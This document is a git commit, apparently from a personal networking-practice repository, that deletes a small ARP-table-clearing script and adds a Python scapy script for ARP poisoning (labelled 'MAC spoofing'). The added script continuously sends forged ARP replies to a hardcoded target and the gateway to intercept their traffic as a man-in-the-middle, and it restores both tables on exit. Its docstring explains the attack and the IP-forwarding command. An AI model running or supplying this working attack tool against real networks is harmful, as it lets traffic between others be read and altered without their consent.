181a7e6574ef15f8e821243f7999a15896d4c579
Shikiso <lewisemerson00@gmail.com>
2025-04-15 18:34:31 +0800

    Mac spoofing

--- Sniffer/clear_arp_table.py
+++
@@ -1,8 +0,0 @@
-import os
-
-network_address = '192.168.0.0'
-
-for i in range(1, 255):
-    address = network_address[:-1]
-    address += str(i)
-    os.system("sudo arp -d " + address)
---
+++ Spoofing/spoofMAC.py
@@ -0,0 +1,52 @@
+'''
+MAC spoofing is mainly used to sniff packets being sent between
+a host and the default gateway. To change your mac address to look
+like a different devices you need to change the ARP table on the host
+device. This can be done when a device sends an ARP request for the
+default gateway the attacker sends a packet saying that they are the device.
+This then tricks the host into sending all packets to the attacker.
+Which the attacker can read and manipulate before being sent to the
+actual router.
+
+In this script we just send the ARP packets constantly instead
+of waiting for a ARP request to be made.
+
+Use this command below to enable packet forwarding.
+Otherwise you wont be able to have a internet connection.
+sudo sysctl -w net.ipv4.ip_forward=1
+'''
+
+from scapy.all import conf, getmacbyip, ARP, send
+
+# Network interface to use
+interface = 'wlan0'
+
+# Getting default gateway information
+default_gateway_ip = conf.route.route("0.0.0.0")[2]
+
+# Getting device information
+device_ip = conf.route.route("0.0.0.0")[1]
+
+# Target infomation
+target_ip = '192.168.0.88'
+
+def spoof(destinationIP, sourceIP):
+    destinationMAC = getmacbyip(destinationIP)
+    packet = ARP(op=2, hwdst=destinationMAC, pdst=destinationIP, psrc=sourceIP)
+    send(packet, iface=interface, verbose=False)
+
+def restore(destinationIP, sourceIP):
+    destinationMAC = getmacbyip(destinationIP)
+    sourceMAC = getmacbyip(sourceIP)
+    packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
+    send(packet, iface=interface, verbose=False)
+
+try:
+    print("Spoofing...")
+    while True:
+        spoof(target_ip, default_gateway_ip)
+        spoof(default_gateway_ip, target_ip)
+except KeyboardInterrupt:
+    print("Restoring...")
+    restore(target_ip, default_gateway_ip)
+    restore(default_gateway_ip, target_ip)
